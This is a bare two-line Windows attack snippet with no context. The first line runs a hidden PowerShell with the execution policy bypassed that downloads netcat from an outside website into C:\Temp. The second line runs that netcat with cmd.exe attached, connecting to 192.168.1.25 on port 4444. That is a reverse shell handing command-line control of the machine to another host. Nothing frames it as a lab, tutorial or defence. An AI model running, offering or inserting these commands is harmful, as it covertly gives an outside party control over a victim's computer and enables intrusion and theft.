powershell -Command "powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('https://joncraton.org/files/nc111nt.zip','C:\Temp\nc.exe');"

C:\Temp\nc.exe -e cmd.exe 192.168.1.25 4444
